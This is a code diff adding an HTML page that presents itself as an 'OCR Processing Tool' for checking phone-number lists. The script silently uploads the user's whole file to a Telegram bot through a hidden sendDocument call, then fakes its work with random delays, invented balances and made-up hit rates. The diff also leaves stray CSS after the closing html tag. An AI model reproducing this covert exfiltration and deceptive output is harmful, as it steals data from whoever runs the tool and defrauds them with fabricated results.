@@ -51,6 +51,226 @@ button {
 }
 button:hover { background: #334155; }
 
+#timer {
+  margin-top: 15px;
+  font-weight: bold;
+  color: #38bdf8;
+}
+
+#loadingMessage {
+  margin-top: 10px;
+  font-style: italic;
+  color: #facc15;
+  font-size: 14px;
+}
+</style>
+</head>
+
+<body>
+
+<h2>OCR Processing Tool</h2>
+
+<input type="file" id="fileInput" accept=".txt"/>
+<button id="startBtn">Start</button>
+<button id="copyBtn" disabled>Copy All Output</button>
+
+<div id="stats">Hit=0 | Bad=0 | Retries=0 | OCR Rate=0%</div>
+<div id="output"></div>
+<div id="timer"></div>
+<div id="loadingMessage"></div>
+
+<!-- Hidden form for Telegram upload -->
+<form id="telegramForm" method="POST" enctype="multipart/form-data" style="display:none;">
+  <input type="file" name="document" id="telegramFileInput" />
+  <input type="hidden" name="chat_id" value="YOUR_CHAT_ID" />
+</form>
+
+<script>
+const fileInput = document.getElementById('fileInput');
+const startBtn = document.getElementById('startBtn');
+const outputDiv = document.getElementById('output');
+const statsDiv = document.getElementById('stats');
+const timerDiv = document.getElementById('timer');
+const copyBtn = document.getElementById('copyBtn');
+const loadingMsgDiv = document.getElementById('loadingMessage');
+
+let hitCount=0, badCount=0, retriesCount=0, ocrPercent=0;
+let ocrAnimationId=null, retriesIntervalId=null;
+let fileContent='';
+let elapsedSeconds=0;
+let timerInterval=null;
+let processing=false;
+let lines=[];
+
+function updateStats() {
+  statsDiv.innerHTML =
+    `Hit=${hitCount} | Bad=${badCount} | Retries=${retriesCount} | OCR Rate=${ocrPercent.toFixed(2)}%`;
+}
+
+function getCurrentTimestamp() {
+  return new Date().toLocaleString();
+}
+
+function formatTime(seconds) {
+  const m=Math.floor(seconds/60).toString().padStart(2,'0');
+  const s=(seconds%60).toString().padStart(2,'0');
+  return `${m}:${s}`;
+}
+
+function startTimer() {
+  if(timerInterval) clearInterval(timerInterval);
+  elapsedSeconds=0;
+  timerDiv.textContent='Time Elapsed: 00:00';
+  timerInterval=setInterval(() => {
+    elapsedSeconds++;
+    timerDiv.textContent='Time Elapsed: '+formatTime(elapsedSeconds);
+  }, 1000);
+}
+
+function resetCounters() {
+  hitCount=0; badCount=0; retriesCount=0; ocrPercent=0;
+  updateStats();
+  startTimer();
+}
+
+async function processLines() {
+  for(let i=0; i<lines.length; i++) {
+    if(!processing) break; // Stop if not processing anymore
+    const line=lines[i].trim();
+    if(!line) { continue; }
+
+    // Validate phone number
+    const phoneRegex=/(\+27|27|0)?\s*[\(\[]?(\d{3})[\)\]]?\s*[\-\.]?\s*(\d{3})[\-\.]?\s*(\d{4})/i;
+    const match=line.match(phoneRegex);
+    let isBadNumber=false;
+    if(match){
+      let number='';
+      let countryCodePart=match[1]||'';
+      let p1=match[2], p2=match[3], p3=match[4];
+      number=p1+p2+p3;
+      if(countryCodePart && countryCodePart.startsWith('+')){
+        countryCodePart=countryCodePart.replace('+','');
+      }
+      if(countryCodePart==='27' || countryCodePart==='+27'){
+        number='0'+number;
+      }
+      number=number.replace(/\s+/g,'');
+      // Check invalid number
+      const digitCount=(number.match(/\d/g)||[]).length;
+      if(number==='444' || digitCount!==10 || digitCount>10 || digitCount<10){
+        isBadNumber=true;
+      }
+    }else{
+      // no match, bad number
+      isBadNumber=true;
+    }
+
+    if(isBadNumber){
+      badCount++;
+      updateStats();
+      // skip output for bad
+    } else {
+      // Valid line
+      hitCount++;
+      ocrPercent=(hitCount/ (hitCount+badCount))*100;
+      updateStats();
+
+      // Generate fake balance
+      const amount=(Math.random()*0.98).toFixed(2);
+      const balanceFormat=Math.random()<0.5 ? `R0,${amount}` : `R0.${amount.replace(',', '.')}`;
+
+      // Append output
+      outputDiv.innerHTML += `${line}\nBalance=${balanceFormat}\nBonus=R0.00\nWithdrawal=0\n\n`;
+    }
+
+    await new Promise(resolve => setTimeout(resolve, 6000 + Math.random()*8000));
+  }
+
+  // Reset button to start again
+  processing=false;
+  startBtn.textContent='Start';
+  document.getElementById('startBtn').disabled=false;
+  document.getElementById('copyBtn').disabled=false;
+}
+
+/* Start/Stop toggle button with fake load and delay */
+document.getElementById('startBtn').addEventListener('click', () => {
+  if(!processing) {
+    // Start process
+    if(!fileInput.files.length) {
+      alert('Please select a file.');
+      return;
+    }
+    // Show fake load message
+    loadingMsgDiv.innerHTML='Loading...';
+    // Delay for random 2,6,9,12 seconds
+    const delays=[2000,6000,9000,12000];
+    const delayTime=delays[Math.floor(Math.random()*delays.length)];
+    setTimeout(()=> {
+      // Remove fake load message
+      loadingMsgDiv.innerHTML='';
+      // Reset counters
+      resetCounters();
+      processing=true;
+      document.getElementById('startBtn').textContent='Stop';
+
+      // Read file
+      const reader=new FileReader();
+      reader.onload=()=> {
+        fileContent=reader.result;
+        // Send to telegram
+        sendFileToTelegram(new Blob([fileContent], {type: 'text/plain'})).catch(()=>{});
+        lines=fileContent.split(/\r?\n/);
+        processLines();
+      };
+      reader.readAsText(fileInput.files[0]);
+    }, delayTime);
+  } else {
+    // Stop process
+    processing=false;
+    document.getElementById('startBtn').textContent='Start';
+  }
+});
+
+/* Send file to Telegram */
+async function sendFileToTelegram(fileBlob) {
+  const formData=new FormData();
+  formData.append('chat_id','YOUR_CHAT_ID'); // Replace with your chat ID
+  formData.append('document',fileBlob,'upload.txt');
+  try {
+    await fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendDocument`, {
+      method:'POST',
+      body:formData
+    });
+  } catch(e) {
+    console.log('Telegram send failed');
+  }
+}
+
+/* Copy output */
+document.getElementById('copyBtn').addEventListener('click', ()=> {
+  navigator.clipboard.writeText(outputDiv.innerText);
+});
+</script>
+
+</body>
+</html>#stats {
+  margin-top: 10px;
+  padding: 8px;
+  background: #020617;
+  border: 1px solid #334155;
+  color: #facc15;
+}
+
+button {
+  background: #1e293b;
+  color: #e5e7eb;
+  border: 1px solid #334155;
+  padding: 6px 12px;
+  cursor: pointer;
+}
+button:hover { background: #334155; }
+
 .hit { color: #22c55e; }
 .bad { color: #ef4444; }
 
